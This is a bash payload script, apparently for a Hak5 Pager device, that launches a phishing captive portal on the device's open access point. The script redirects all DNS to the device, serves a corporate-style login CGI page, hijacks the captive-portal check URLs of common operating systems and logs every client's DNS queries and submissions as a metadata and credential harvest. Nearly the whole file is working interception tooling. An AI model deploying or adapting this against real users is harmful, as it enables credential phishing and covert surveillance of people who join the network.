#!/bin/bash
# Title: KB Portal Start
# Description: Captive portal on the Pager's own access point (pager-open). Wildcard-DNS + uhttpd serve a login-style page to anything that JOINS the AP; every request is inventoried. Stop with KB Portal Stop.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

# Device-verified mechanics (2026-09-06/07 spikes, all witnessed on live device):
# - wildcard DNS: drop "address=/#/<ip>" into dnsmasq conf-dir (discovered from
#   generated conf line, dynamic NOT hardcoded) + restart dnsmasq.hak5 => ~2s
# - revert: rm drop + restart => real answers ~2s (witnessed google.com 142.x)
# - uhttpd: *.cgi executes; POST body via CONTENT_LENGTH dd; REMOTE_ADDR/UA/REFERER
#   present; -y alias works (captive probes gen_204/generate_204/ncsi/hotspot-detect)
# - scope: clients who JOIN our AP only. No rogue AP spawn (phy cannot bring up
#   fresh vifs - device-proven), no TX beyond serving pages.

LOG green "KB Portal Start v1.0"

STATE=${KBP_STATE:-/root/loot/kb_portal}
ROOTP=${KBP_ROOT:-/root/portals}
MARKER="$STATE/active"
mkdir -p "$STATE" 2>/dev/null || { LOG red "cannot create $STATE"; ALERT "No loot dir"; exit 0; }
command -v uhttpd >/dev/null 2>&1 || { LOG red "uhttpd missing - run KB Portal Install first"; ALERT "Run Install first"; exit 0; }

DNSINIT=${KBP_DNSINIT:-/etc/init.d/dnsmasq.hak5}
GENCONF=${KBP_GENCONF:-/var/etc/dnsmasq.conf.cfg*}

# self-heal leftovers of a killed run (marker survives SIGKILL by design)
if [ -f "$MARKER" ]; then
  OLD_PID=$(sed -n 's/^PID=//p' "$MARKER" | head -1)
  OLD_DROP=$(sed -n 's/^DROP=//p' "$MARKER" | head -1)
  OLD_DROPQ=$(sed -n 's/^DROPQ=//p' "$MARKER" | head -1)
  LOG yellow "previous portal left running - healing first"
  [ -n "$OLD_PID" ] && kill "$OLD_PID" 2>/dev/null
  if [ -n "$OLD_DROP" ] && [ -f "$OLD_DROP" ]; then rm -f "$OLD_DROP"; fi
  [ -n "$OLD_DROPQ" ] && rm -f "$OLD_DROPQ"
  [ -f "$OLD_DROP" ] || [ -f "$OLD_DROPQ" ] || true
  "$DNSINIT" restart >/dev/null 2>&1
  rm -f "$MARKER"
fi

# port 80 must be ours
if netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE ":80$"; then
  LOG red "port 80 already in use (stock uhttpd? another service?) - portal not started"
  ALERT "Port 80 busy"
  exit 0
fi

# discover the conf-dir dynamically (instance-suffixed, measured 2026-09-06)
CONFDIR=$(grep -m1 '^conf-dir=' $GENCONF 2>/dev/null | head -1 | cut -d= -f2)
[ -n "$CONFDIR" ] && [ -d "$CONFDIR" ] || { LOG red "dnsmasq conf-dir not found - DNS capture impossible"; ALERT "No conf-dir"; exit 0; }

# br-lan IP (the address every hostname will resolve to)
IP=$(ip -4 addr show br-lan 2>/dev/null | awk '/inet /{split($2,a,"/"); print a[1]; exit}')
[ -n "$IP" ] || { LOG red "br-lan has no IPv4 - Pager not in AP mode?"; ALERT "No br-lan IP"; exit 0; }

# self-deploy bundled template (payload dir is stable on device)
TPLSRC=/root/payloads/user/interception/kb_portal_start/template/corp_gate
if [ ! -d "$ROOTP/corp_gate" ] && [ -d "$TPLSRC" ]; then
  mkdir -p "$ROOTP" && cp -r "$TPLSRC" "$ROOTP/corp_gate" && chmod 755 "$ROOTP/corp_gate/login.cgi" \
    && LOG green "bundled template deployed -> $ROOTP/corp_gate" \
    || LOG red "template copy failed"
fi

# template picker: every dir under /root/portals with a login.cgi
TPLS=""
for d in "$ROOTP"/*/; do
  [ -f "$d/login.cgi" ] || continue
  b=$(basename "$d"); [ "$b" = "current" ] && continue
  TPLS="$TPLS$b
"
done
[ -n "$TPLS" ] || { LOG red "no templates in /root/portals (Install adds corp_gate)"; ALERT "No templates"; exit 0; }

PICK=$(LIST_PICKER "Portal template" "corp_gate" "Leave") || { LOG red "cancelled - nothing started"; exit 0; }
[ "$PICK" = "Leave" ] && { LOG green "cancelled - nothing started"; exit 0; }
[ -d "$ROOTP/$PICK" ] || { LOG red "template $PICK not installed - run KB Portal Install"; ALERT "No template"; exit 0; }

LOG cyan "wildcard DNS: * -> $IP (~2s to take effect)"
DROP="$CONFDIR/kbportal.conf"
DROPQ="$CONFDIR/kbportal_qlog.conf"
echo "address=/#/$IP" > "$DROP" || { LOG red "cannot write drop into $CONFDIR"; ALERT "Drop failed"; exit 0; }
# log-queries=extra: every DNS query from every connected client, with source IP.
# This is the passive metadata harvest: hostnames, vendor telemetry domains
# (= what is installed), search suffixes (= where the device comes from).
touch /tmp/kbportal_dns.log; chmod 666 /tmp/kbportal_dns.log 2>/dev/null
# CGI uid cannot traverse /root (700) - captures go to a world-writable /tmp sink;
# KB Portal Stop archives them into $STATE as root (live lesson 2026-09-07).
touch /tmp/kbportal_capture.log; chmod 666 /tmp/kbportal_capture.log 2>/dev/null
chmod 777 "$STATE" 2>/dev/null
printf 'log-queries=extra\nlog-facility=/tmp/kbportal_dns.log\nlog-dhcp\n' > "$DROPQ" 2>/dev/null || LOG yellow "qlog drop failed - continuing without DNS logging"
"$DNSINIT" restart >/dev/null 2>&1

TLSOPT=""; TLSLOG=""
if [ -f "$ROOTP/kb_portal.crt" ] && [ -f "$ROOTP/kb_portal.key" ]; then
  # uhttpd needs SPLIT cert/key via -s port -C crt -K key (combined pem via -c is the
  # CONFIG-FILE flag - launch dies "specify a certificate and a key file", live-witnessed)
  TLSOPT="-s 8443 -C $ROOTP/kb_portal.crt -K $ROOTP/kb_portal.key"; TLSLOG=" +https:8443"
fi

ln -sfn "$ROOTP/$PICK" "$ROOTP/current"
LOG cyan "serving current -> $PICK on :80$TLSLOG (probes aliased)"
# NO -P: on this uhttpd -P is the TLS CIPHER LIST (usage: "-P ciphers"), not a
# pidfile - with https enabled it dies "No recognized ciphers in cipher list"
# (live-witnessed 2026-09-07). uhttpd forks itself; pidof is authoritative here
# because port-80 precheck + self-heal guarantee this is the only instance.
# Flag triad, each bought by a live failure (2026-09-07):
#  -c /dev/null  bypass stock /etc/httpd.conf (silently breaks CGI)
#  -i .cgi=/bin/sh  execute .cgi ANYWHERE incl docroot root (default handler only
#                covers /cgi-bin; aliases alone serve the file RAW, never exec)
#  -x /cgi-bin  keep the stock handler too (explicit, defensive)
uhttpd -c /dev/null -p 80 -h "$ROOTP/current" $TLSOPT \
  -i .cgi=/bin/sh -x /cgi-bin \
  -y /generate_204=/login.cgi -y /gen_204=/login.cgi \
  -y /hotspot-detect.html=/login.cgi -y /ncsi.txt=/login.cgi \
  -y /connecttest.txt=/login.cgi -y /favicon.ico=/login.cgi \
  >/dev/null 2>&1
sleep 1
PID=$(pidof uhttpd 2>/dev/null | awk '{print $1}')
[ -n "$PID" ] && kill -0 "$PID" 2>/dev/null || {
  LOG red "uhttpd died on launch - reverting DNS"
  rm -f "$DROP" "$DROPQ"; "$DNSINIT" restart >/dev/null 2>&1
  ALERT "Launch failed"
  exit 0
}

echo "PID=$PID
DROP=$DROP
DROPQ=$DROPQ
TPL=$PICK
IP=$IP
TS=$(date -u +%FT%TZ)" > "$MARKER"

LOG green "PORTAL LIVE: template=$PICK pid=$PID"
LOG "anything joining the pager-open AP gets pulled to the portal"
LOG "capture log: $STATE/$PICK.log   - stop with KB Portal Stop"
VIBRATE "Portal:d=6,o=6,b=250:r" || LOG yellow "vibrate skipped"
ALERT "Portal live: $PICK"
exit 0
